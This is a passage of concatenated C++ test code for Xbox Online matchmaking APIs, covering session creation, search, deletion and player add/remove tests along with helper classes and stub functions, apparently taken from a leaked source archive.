		{
			FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
		}

		hr = PollTaskUntilComplete(hSessionTask, hSessionEvent, TestingTime, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			xLog(hLog, XLL_INFO, "Pumping XOnlineMatchSessionCreate returned 0x%08x", hr);
			FAIL_TESTCASE("Session creation failed asynchronously");
		}
		else if (!fDone)
		{
			FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
		}

		PASS_TESTCASE("Session successfully advertised");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	xSetFunctionName(hLog, "");

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSessionGetInfo");
	xStartVariation(hLog, "Call XOnlineMatchSessionGetInfo");
//==================================================================================
	BOOL	bValidSession = FALSE;

	while(TRUE)
	{
		hr = XOnlineMatchSessionGetInfo(hSessionTask, &SessionID, &KeyExchangeKey);

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetInfo  returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSessionGetInfo  failed unexpectedly");
		}
		else if(*((ULONGLONG *) &SessionID) == 0)
		{
			FAIL_TESTCASE("XOnlineMatchSessionGetInfo  returned success but didn't return session ID");
		}

		PASS_TESTCASE("XOnlineMatchSessionGetInfo return correctly");
		bValidSession = TRUE;
		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	CLEANUP_TASK(hSessionTask);
	xSetFunctionName(hLog, "");

	if(!bValidSession)
	{
		xLog(hLog, XLL_INFO, "Couldn't get session id. Should finish whole test.");
		goto Exit;
	}

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSessionUpdate");
	xStartVariation(hLog, "Advertise a session on the matchmaking server");
//==================================================================================
	while(TRUE)
	{
		xOnAttr[0].dwAttributeID = GLOBALINT_ID1;
		xOnAttr[0].info.integer.qwValue = INT1;
		xOnAttr[1].dwAttributeID = GLOBALSTR_ID1;
		xOnAttr[1].info.string.pwszValue = STRING1;
		xOnAttr[2].dwAttributeID = GLOBALBLB_ID1;
		xOnAttr[2].info.blob.pvValue = BLOB1;
		xOnAttr[2].info.blob.dwLength = strlen(BLOB1);
#if 0
		xOnAttr[3].dwAttributeID = GLOBALINT_ID2;
		xOnAttr[3].info.integer.qwValue = INT2;
		xOnAttr[4].dwAttributeID = GLOBALSTR_ID2;
		xOnAttr[4].info.string.pwszValue = STRING2;
		xOnAttr[5].dwAttributeID = GLOBALBLB_ID2;
		xOnAttr[5].info.blob.pvValue = BLOB2;
		xOnAttr[5].info.blob.dwLength = strlen(BLOB2);
#endif
		
		hr = XOnlineMatchSessionUpdate(SessionID, 5,5,5,5,3, xOnAttr, hUpdateEvent, &hUpdateTask );

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionUpdate returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSessionUpdate failed unexpectedly");
		}

		hr = PollTaskUntilComplete(hUpdateTask, hUpdateEvent, TestingTime, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			xLog(hLog, XLL_INFO, "Pumping XOnlineMatchSessionUpdate returned 0x%08x", hr);
			FAIL_TESTCASE("Session creation failed asynchronously");
		}
		else if (!fDone)
		{
			FAIL_TESTCASE("Session creation didn't complete within 30 seconds");
		}

		hr = XOnlineMatchSessionGetInfo(hUpdateTask, &newSessionID, &KeyExchangeKey);

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionGetID  returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSessionGetID  failed unexpectedly");
		}
		else if(*((ULONGLONG *) &SessionID) != *((ULONGLONG *) &newSessionID))
		{
			FAIL_TESTCASE("XOnlineMatchSessionGetID  returned different session ID");
		}

		PASS_TESTCASE("Session successfully advertised");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	CLEANUP_TASK(hUpdateTask);
	xSetFunctionName(hLog, "");
//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSearch");
	xStartVariation(hLog, "Search for a session on the matchmaking server");
//==================================================================================

	while(TRUE)
	{
		xOnAttr[0].dwAttributeID = X_ATTRIBUTE_DATATYPE_INTEGER;
		xOnAttr[0].info.integer.qwValue = *((ULONGLONG *) &SessionID);
//		hr = XOnlineMatchSearch(0, 10, 0, NULL, 10*(sizeof(XMATCH_SEARCHRESULT) + 500), hSearchEvent, &hSearchTask);
		hr = XOnlineMatchSearch(GETSESSINT_INDEX, 1, 1, xOnAttr, sizeof(XMATCH_SEARCHRESULT) + 500, hSearchEvent, &hSearchTask);

		xLog(hLog, XLL_INFO, "XOnlineMatchSearchCreate returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSearchCreate failed unexpectedly");
		}

		hr = PollTaskUntilComplete(hSearchTask, hSearchEvent, TestingTime, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			xLog(hLog, XLL_INFO, "Pumping XOnlineMatchSearchCreate returned 0x%08x", hr);
			FAIL_TESTCASE("Session search failed asynchronously");
		}
		else if (!fDone)
		{
			FAIL_TESTCASE("Session search didn't complete within 30 seconds");
		}

		PASS_TESTCASE("Session search successful");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	xSetFunctionName(hLog, "");

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSearchGetResults");
	xStartVariation(hLog, "Call XOnlineMatchSearchGetResults");
//==================================================================================

	while(TRUE)
	{
		hr = XOnlineMatchSearchGetResults(hSearchTask, &ppSearchResult, &dwNumResults);

		xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetResults returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSearchGetResults failed unexpectedly");
		}
		else if(!dwNumResults)
		{
			FAIL_TESTCASE("XOnlineMatchSearchGetResults succeeded but didn't return a result");
		}

		if(ppSearchResult == NULL)
		{
			FAIL_TESTCASE("Returned search result is NULL");
		}

		if(memcmp(&((ppSearchResult[0])->SessionID), &SessionID, sizeof(XNKID)))
		{
			FAIL_TESTCASE("Returned search result had incorrect session ID");
		}

		PASS_TESTCASE("Call XOnlineMatchSearchGetResults successful");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	

	xSetFunctionName(hLog, "");

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSearchParse");
	xStartVariation(hLog, "Call XOnlineMatchSearchParse");
//==================================================================================

#pragma pack(push, 1)
	typedef struct
	{
		ULONGLONG	syInt;
	} SYSearchStruct;
#pragma pack(pop)

	while(TRUE)
	{
		XONLINE_ATTRIBUTE_SPEC	xonAttribSpec[3];
		SYSearchStruct	sySeachParse;
		
		xonAttribSpec[0].type = X_ATTRIBUTE_DATATYPE_INTEGER;
		xonAttribSpec[0].length = 8;

		for( DWORD ii=0; ii<dwNumResults; ii++)
		{
			hr = XOnlineMatchSearchParse(ppSearchResult[ii], 1, xonAttribSpec, (PVOID)&sySeachParse);

			xLog(hLog, XLL_INFO, "XOnlineMatchSearchParse returned 0x%08x", hr);
			if(FAILED(hr))
			{
				FAIL_TESTCASE("XOnlineMatchSearchParse failed unexpectedly");
			}
		}
		
		PASS_TESTCASE("Call XOnlineMatchSearchParse successful");

//
// Here need to check if the result is correct.
//

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	CLEANUP_TASK(hSearchTask);
	xSetFunctionName(hLog, "");

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSessionFindFromID");
	xStartVariation(hLog, "Search for a session using session ID on the matchmaking server");
//==================================================================================
	XONLINETASK_HANDLE hFindFromIDTask;
	HANDLE hFindFromIDEvent;

	hFindFromIDEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	while(TRUE)
	{
		hr = XOnlineMatchSessionFindFromID(SessionID, hFindFromIDEvent, &hFindFromIDTask);

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionFindFromID returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSessionFindFromID failed unexpectedly");
		}

		hr = PollTaskUntilComplete(hFindFromIDTask, hFindFromIDEvent, TestingTime, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			xLog(hLog, XLL_INFO, "Pumping XOnlineMatchSessionFindFromID returned 0x%08x", hr);
			FAIL_TESTCASE("Session search using Session ID failed asynchronously");
		}
		else if (!fDone)
		{
			FAIL_TESTCASE("Session search using Session ID didn't complete within 30 seconds");
		}

		PASS_TESTCASE("Session search using Session ID successful");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	xSetFunctionName(hLog, "");

//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSearchGetResults");
	xStartVariation(hLog, "Call XOnlineMatchSearchGetResults");
//==================================================================================

	while(TRUE)
	{
		hr = XOnlineMatchSearchGetResults(hFindFromIDTask, &ppSearchResult, &dwNumResults);

		xLog(hLog, XLL_INFO, "XOnlineMatchSearchGetResults returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSearchGetResults failed unexpectedly");
		}
		else if(!dwNumResults)
		{
			FAIL_TESTCASE("XOnlineMatchSearchGetResults succeeded but didn't return a result");
		}

		if(ppSearchResult == NULL)
		{
			FAIL_TESTCASE("Returned search result is NULL");
		}

		if(memcmp(&((ppSearchResult[0])->SessionID), &SessionID, sizeof(XNKID)))
		{
			FAIL_TESTCASE("Returned search result had incorrect session ID");
		}

		PASS_TESTCASE("Call XOnlineMatchSearchGetResults successful");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	CLEANUP_TASK(hFindFromIDTask);
	xSetFunctionName(hLog, "");


//==================================================================================
	xSetFunctionName(hLog, "XOnlineMatchSessionDelete");
	xStartVariation(hLog, "Delete a session that was created earlier");
//==================================================================================

	while(TRUE)
	{
		hr = XOnlineMatchSessionDelete(SessionID, hDeleteEvent, &hDeleteTask);

		xLog(hLog, XLL_INFO, "XOnlineMatchSessionDelete returned 0x%08x", hr);
		if(FAILED(hr))
		{
			FAIL_TESTCASE("XOnlineMatchSessionDelete failed unexpectedly");
		}

		hr = PollTaskUntilComplete(hDeleteTask, hDeleteEvent, TestingTime, NULL, &fDone, FALSE);
		if(FAILED(hr))
		{
			xLog(hLog, XLL_INFO, "Pumping XOnlineMatchSessionDelete returned 0x%08x", hr);
			FAIL_TESTCASE("Session delete failed asynchronously");
		}
		else if (!fDone)
		{
			FAIL_TESTCASE("Session delete didn't complete within 30 seconds");
		}

		PASS_TESTCASE("Session delete successful");

		break; 
	}; 

	PUMP_CS_EVENT()
	xEndVariation(hLog);
	
	CLEANUP_TASK(hDeleteTask);
	xSetFunctionName(hLog, "");


Exit:

	if(hSessionTask)
		CLEANUP_TASK(hSessionTask);

	if(hSessionEvent)
		CloseHandle(hSessionEvent);

	if(hUpdateTask)
		CLEANUP_TASK(hUpdateTask);

	if(hUpdateEvent)
		CloseHandle(hUpdateEvent);

	if(hSearchTask)
		CLEANUP_TASK(hSearchTask);

	if(hSearchEvent)
		CloseHandle(hSearchEvent);

	if(hSearchTask)
		CLEANUP_TASK(hFindFromIDTask);

	if(hSearchEvent)
		CloseHandle(hFindFromIDEvent);

	if(hDeleteTask)
		CLEANUP_TASK(hDeleteTask);

	if(hDeleteEvent)
		CloseHandle(hDeleteEvent);

	CLEANUP_TASK(hLogon);

	if(hLogonEvent)
		CloseHandle(hLogonEvent);
     
	hr = XOnlineCleanup();
	Verify(hr == S_OK);	

	return;
}

//==================================================================================
// XMatchBVTEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI XMatchBVTEndTest()
{

}

} // namespace XAuthTestNamespace

// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XMatchBVT )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( XMatchBVT )
    EXPORT_TABLE_ENTRY( "StartTest", XMatchBVTStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XMatchBVTEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", XMatchBVTDllMain )
END_EXPORT_TABLE( XMatchBVT )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\xmclasses.h ===
//==================================================================================
// xmclasses.h: header for XMatch request helper classes
//==================================================================================

#if !defined(XMCLASSES_H)
#define XMCLASSES_H

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <xtl.h>
#include <xdbg.h>
#include <xonline.h>
#include "asyncrequest.h"

#define MAX_STRESS_SEARCH_RESULTS 10

//==================================================================================
// Structures
//==================================================================================
typedef struct
{
	ULONGLONG	UserID;
	DWORD		dwAttributeID;
	union
	{
		ULONGLONG		qwValue;
		VOID			*pvValue;
	} Value;
} ATTRIBUTE, *PATTRIBUTE;

typedef struct
{
	DWORD			dwParameterType;
	union
	{
		ULONGLONG		qwValue;
		VOID			*pvValue;
	} Value;
} PARAMETER, *PPARAMETER;

typedef enum
{
    xmatchWorking = 0,
    xmatchCancelled,
    xmatchDone

} XMATCH_STATE;

//==================================================================================
// CXMatchSearchRequest
//==================================================================================
class CXMatchSearchRequest : public CXOnlineAsyncRequest
{
public:
	CXMatchSearchRequest(DWORD dwProcedure, DWORD dwNumParameters, DWORD dwParametersLen, DWORD dwResultsLen);
	BOOL AddParameters(PPARAMETER pParameterArray, DWORD dwParameterCount);
	HRESULT GetResults(PXMATCH_SEARCHRESULT** pppSearchResults, DWORD *pdwReturnedResults);
	HRESULT GetAttribute(DWORD dwSearchResultIndex, DWORD dwAttributeIndex, DWORD *pdwAttributeID, VOID *pAttributeValue,
		DWORD *pcbAttributeValue);
	HRESULT StartRequest();
};

//==================================================================================
// CXMatchSessionRequest
//==================================================================================
class CXMatchSessionRequest : public CXOnlineAsyncRequest
{
public:
	CXMatchSessionRequest(XNKID SessionID, DWORD dwNumAttributes, DWORD dwAttributesLen);
	BOOL AddAttributes(PATTRIBUTE pAttributeArray, DWORD dwAttributeCount);
	HRESULT GetSessionID(XNKID *pSessionID);
	HRESULT GetKeyExchangeKey(BYTE *pKeyExchangeKey, DWORD *pdwKeySize);
	HRESULT StartRequest();
};

#endif // !defined(XMCLASSES_H)
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\common\xmclasses.cpp ===
//==================================================================================
// xmclasses.cpp: implementation of various helper classes for
//                handling asynchronous XMatch requests
//==================================================================================
#include "xmclasses.h"

//
// BUGBUG: Dummy stubs to let it compile
//

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionCreate(
    IN XNKID SessionID,
    IN DWORD dwNumAttributes,
    IN DWORD dwAttributesLen,
    IN HANDLE hWorkEvent,
    OUT XONLINETASK_HANDLE* phSession
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionSetInt(
    IN XONLINETASK_HANDLE hSession,
    IN DWORD dwAttributeID,
    IN ULONGLONG qwUserPUID,
    IN ULONGLONG qwAttributeValue
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionSetString(
    IN XONLINETASK_HANDLE hSession,
    IN DWORD dwAttributeID,
    IN ULONGLONG qwUserPUID,
    IN LPCWSTR pwszAttributeValue
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionSetBlob(
    IN XONLINETASK_HANDLE hSession,
    IN DWORD dwAttributeID,
    IN ULONGLONG qwUserPUID,
    IN DWORD dwAttributeLength,
    IN PVOID pvAttributeValue
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionAddPlayer(
    IN XONLINETASK_HANDLE hSession,
    IN ULONGLONG qwUserPUID
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionRemovePlayer(
    IN XONLINETASK_HANDLE hSession,
    IN ULONGLONG qwUserPUID
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionSend(
    IN XONLINETASK_HANDLE hSession
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionGetID (
    IN XONLINETASK_HANDLE hSession,
    OUT XNKID* pSessionID
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionDelete(
    IN XNKID SessionID,
    IN HANDLE hWorkEvent,
    OUT PXONLINETASK_HANDLE phDelete
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSessionFindFromID(
    IN XNKID SessionID,
    IN HANDLE hWorkEvent,
    OUT PXONLINETASK_HANDLE phSearch
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchCreate(
    IN DWORD dwProcedureIndex,
    IN DWORD dwNumResults,
    IN DWORD dwNumParameters,
    IN DWORD dwParametersLen,
    IN DWORD dwResultsLen,
    IN HANDLE hWorkEvent,
    OUT PXONLINETASK_HANDLE phSearch
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchAppendInt(
    IN XONLINETASK_HANDLE hSearch,
    IN ULONGLONG qwParameterValue
    )
{
    return S_OK;
}

XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchAppendString(
    IN XONLINETASK_HANDLE hSearch,
    IN LPCWSTR pwszParameterValue
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchAppendBlob(
    IN XONLINETASK_HANDLE hSearch,
    IN DWORD dwParameterLen,
    IN LPVOID pvParameterValue
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchSend(
    IN XONLINETASK_HANDLE hSearch
    )
{
    return S_OK;
}
    
XBOXAPI
HRESULT 
WINAPI
XOnlineMatchSearchGetResults(
    IN XONLINETASK_HANDLE hSearch,
    OUT PXMATCH_SEARCHRESULT **prgpSearchResults,
    OUT DWORD *pdwReturnedResults
    )
{
    return S_OK;
}
 
XBOXAPI
HRESULT
WINAPI
XOnlineMatchSearchGetAttribute(
    IN XONLINETASK_HANDLE hSearch,
    IN DWORD dwSearchResultIndex,
    IN DWORD dwAttributeIndex,
    OUT DWORD *pdwAttributeID,
    OUT VOID *pAttributeValue,
    OUT DWORD *pcbAttributeValue
    )
{
    return S_OK;
}

//==================================================================================
// CXMatchSearchRequest
//==================================================================================
CXMatchSearchRequest::CXMatchSearchRequest(DWORD dwProcedure, DWORD dwNumParameters, DWORD dwParametersLen, DWORD dwResultsLen)
{
	HRESULT hr = S_OK;

	m_hWorkEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!m_hWorkEvent)
	{
		m_hTaskHandle = NULL;
		return;
	}

	hr = XOnlineMatchSearchCreate(dwProcedure, MAX_STRESS_SEARCH_RESULTS, dwNumParameters, dwParametersLen, dwResultsLen, m_hWorkEvent, &m_hTaskHandle);
	if(FAILED(hr))
	{
		CloseHandle(m_hWorkEvent);
		m_hWorkEvent = NULL;
		m_hTaskHandle = NULL;
		return;
	}
}

BOOL CXMatchSearchRequest::AddParameters(PPARAMETER pParameterArray, DWORD dwParameterCount)
{
	HRESULT hr = S_OK;
	DWORD dwParameterIndex = 0;
	BOOL fRet = TRUE;

	if(!pParameterArray)
	{
		fRet = FALSE;
		goto Exit;
	}

	for (dwParameterIndex = 0; dwParameterIndex < dwParameterCount; ++dwParameterIndex)
	{
		switch (pParameterArray[dwParameterIndex].dwParameterType & X_ATTRIBUTE_DATATYPE_MASK)
		{
			case X_ATTRIBUTE_DATATYPE_INTEGER:
			{
				hr = XOnlineMatchSearchAppendInt(m_hTaskHandle, pParameterArray[dwParameterIndex].Value.qwValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}

			case X_ATTRIBUTE_DATATYPE_STRING:
			{
				hr = XOnlineMatchSearchAppendString(m_hTaskHandle, (LPWSTR) pParameterArray[dwParameterIndex].Value.pvValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}

			case X_ATTRIBUTE_DATATYPE_BLOB:
			{
				hr = XOnlineMatchSearchAppendBlob(m_hTaskHandle, strlen((LPSTR)pParameterArray[dwParameterIndex].Value.pvValue),
					pParameterArray[dwParameterIndex].Value.pvValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}
		}
	}

Exit:

	return fRet;
}

HRESULT CXMatchSearchRequest::GetResults(PXMATCH_SEARCHRESULT** pppSearchResults, DWORD *pdwReturnedResults)
{
	if(!m_hTaskHandle)
		return E_FAIL;

	return XOnlineMatchSearchGetResults(m_hTaskHandle, pppSearchResults, pdwReturnedResults);
}

HRESULT CXMatchSearchRequest::GetAttribute(DWORD dwSearchResultIndex, DWORD dwAttributeIndex, DWORD *pdwAttributeID,
    VOID *pAttributeValue, DWORD *pcbAttributeValue)
{
	if(!m_hTaskHandle)
		return E_FAIL;

	return XOnlineMatchSearchGetAttribute(m_hTaskHandle, dwSearchResultIndex, dwAttributeIndex, pdwAttributeID,
		pAttributeValue, pcbAttributeValue);
}

HRESULT CXMatchSearchRequest::StartRequest()
{
	if(!m_hTaskHandle)
		return E_FAIL;

	m_nCurrentState = STATE_INPROGRESS;

	return XOnlineMatchSearchSend(m_hTaskHandle);
}

//==================================================================================
// CXMatchSessionRequest
//==================================================================================
CXMatchSessionRequest::CXMatchSessionRequest(XNKID SessionID, DWORD dwNumAttributes, DWORD dwAttributesLen)
{
	HRESULT hr = S_OK;

	m_hWorkEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!m_hWorkEvent)
	{
		m_hTaskHandle = NULL;
		return;
	}

	hr = XOnlineMatchSessionCreate(SessionID, dwNumAttributes, dwAttributesLen, m_hWorkEvent, &m_hTaskHandle);
	if(FAILED(hr))
	{
		CloseHandle(m_hWorkEvent);
		m_hWorkEvent = NULL;
		m_hTaskHandle = NULL;
		return;
	}
}

BOOL CXMatchSessionRequest::AddAttributes(PATTRIBUTE pAttributeArray, DWORD dwAttributeCount)
{
	HRESULT hr = S_OK;
	DWORD dwAttributeIndex = 0;
	BOOL fRet = TRUE;

	if(!pAttributeArray)
	{
		fRet = FALSE;
		goto Exit;
	}

	for (dwAttributeIndex = 0; dwAttributeIndex < dwAttributeCount; ++dwAttributeIndex)
	{
		switch (pAttributeArray[dwAttributeIndex].dwAttributeID & X_ATTRIBUTE_DATATYPE_MASK)
		{
			case X_ATTRIBUTE_DATATYPE_INTEGER:
			{
				hr = XOnlineMatchSessionSetInt(m_hTaskHandle, pAttributeArray[dwAttributeIndex].dwAttributeID,
					pAttributeArray[dwAttributeIndex].UserID, pAttributeArray[dwAttributeIndex].Value.qwValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}

			case X_ATTRIBUTE_DATATYPE_STRING:
			{
				hr = XOnlineMatchSessionSetString(m_hTaskHandle, pAttributeArray[dwAttributeIndex].dwAttributeID,
					pAttributeArray[dwAttributeIndex].UserID, (LPWSTR) pAttributeArray[dwAttributeIndex].Value.pvValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}

			case X_ATTRIBUTE_DATATYPE_BLOB:
			{
				hr = XOnlineMatchSessionSetBlob(m_hTaskHandle, pAttributeArray[dwAttributeIndex].dwAttributeID,
					pAttributeArray[dwAttributeIndex].UserID, strlen((LPSTR)pAttributeArray[dwAttributeIndex].Value.pvValue),
					pAttributeArray[dwAttributeIndex].Value.pvValue );
				if (FAILED(hr))
				{
					fRet = FALSE;
					goto Exit;
				}
				break;
			}
		}
	}

Exit:

	return fRet;
}

HRESULT CXMatchSessionRequest::GetSessionID(XNKID *pSessionID)
{
	if(!m_hTaskHandle)
		return E_FAIL;

	return XOnlineMatchSessionGetID (m_hTaskHandle, pSessionID);
}

HRESULT CXMatchSessionRequest::GetKeyExchangeKey(BYTE *pKeyExchangeKey, DWORD *pdwKeySize)
{
	return E_NOTIMPL;
}

HRESULT CXMatchSessionRequest::StartRequest()
{
	if(!m_hTaskHandle)
		return E_FAIL;

	m_nCurrentState = STATE_INPROGRESS;

	return XOnlineMatchSessionSend(m_hTaskHandle);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\xmatch\core\addremoveplayers.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xmatchtest.h"

using namespace XMatchTestNamespace;

namespace XMatchTestNamespace {

//==================================================================================
// Prototypes
//==================================================================================
HRESULT XMatchTest_AddRemovePlayers(HANDLE hLog);

//==================================================================================
// XMatchTest_AddRemovePlayers
//----------------------------------------------------------------------------------
//
// Description: Contains test cases for adding and removing players from sessions
//
// Arguments:
//	HANDLE hLog		Handle to logging subsystem
//
// Returns: S_OK if the act of running the test was successful (not whether the
//			test itself was successful), the error code otherwise.
//==================================================================================
HRESULT XMatchTest_AddRemovePlayers(HANDLE hLog, XONLINETASK_HANDLE hLogon)
{
	PXMATCH_SEARCHRESULT pSearchResult = NULL;
	XONLINETASK_HANDLE hMatch = NULL, hSearch = NULL;
	XNKID SessionID;
	HRESULT hr = E_FAIL;
    HANDLE hEvent = NULL;
    DWORD dwPollCounter = 0;
	BOOL fCompleted = FALSE, fDone = FALSE;

	memset(&SessionID, 0, sizeof(SessionID));

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if(!hEvent)
		goto Exit;

/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Add player with a NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSessionAddPlayer(NULL, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionAddPlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Remove player with a NULL task handle");
	// -----------------------------------------------------------------

	hr = XOnlineMatchSessionRemovePlayer(NULL, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionRemovePlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer returned success but should have failed!");
	}

	END_TESTCASE();
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Add player with an invalid ID");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, 0);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionAddPlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);	
*/


/* Causes RIP
	// -----------------------------------------------------------------
	START_TESTCASE("Remove player with an invalid ID");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt(), hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionRemovePlayer(hMatch, 0);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionRemovePlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionRemovePlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionRemovePlayer returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);	
*/


	// -----------------------------------------------------------------
	START_TESTCASE("Add player when there isn't enough room in the request");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
	hr = XOnlineMatchSessionCreate(SessionID, 1, GetBufferLenForUserInt() - 1, hEvent, &hMatch );
	
	xLog(hLog, XLL_INFO, "XOnlineMatchSessionCreate returned 0x%08x", hr);
	if(FAILED(hr))
	{
		FAIL_TESTCASE("XOnlineMatchSessionCreate failed unexpectedly");
	}

	hr = XOnlineMatchSessionAddPlayer(hMatch, USER1);

	xLog(hLog, XLL_INFO, "XOnlineMatchSessionAddPlayer returned 0x%08x", hr);
	if(FAILED(hr))
	{
		PASS_TESTCASE("XOnlineMatchSessionAddPlayer failed as expected");
	}
	else
	{
		FAIL_TESTCASE("XOnlineMatchSessionAddPlayer returned success but should have failed!");
	}

	END_TESTCASE();
	CLEANUP_TASK(hMatch);



	// -----------------------------------------------------------------
	START_TESTCASE("Remove player when there isn't enough room in the request");
	// -----------------------------------------------------------------

	memset(&SessionID, 0, sizeof(SessionID));
